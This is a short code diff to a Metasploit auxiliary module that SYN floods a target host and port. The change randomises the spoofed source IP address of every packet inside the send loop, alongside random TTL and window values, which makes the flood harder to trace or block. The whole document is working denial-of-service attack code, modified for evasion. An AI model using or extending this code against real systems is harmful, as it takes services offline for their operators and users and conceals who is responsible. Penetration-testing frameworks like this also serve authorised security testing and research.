@@ -46,12 +46,13 @@ class MetasploitModule < Msf::Auxiliary
     print_status("SYN flooding #{rhost}:#{rport}...")
 
     p = PacketFu::TCPPacket.new
-    p.ip_saddr = srchost
+    
     p.ip_daddr = rhost
     p.tcp_dport = rport
     p.tcp_flags.syn = 1
 
     while (num <= 0) or (sent < num)
+      p.ip_saddr = "%d.%d.%d.%d" % [rand(256), rand(256), rand(256), rand(256)]
       p.ip_ttl = rand(128)+128
       p.tcp_win = rand(4096)+1
       p.tcp_sport = sport
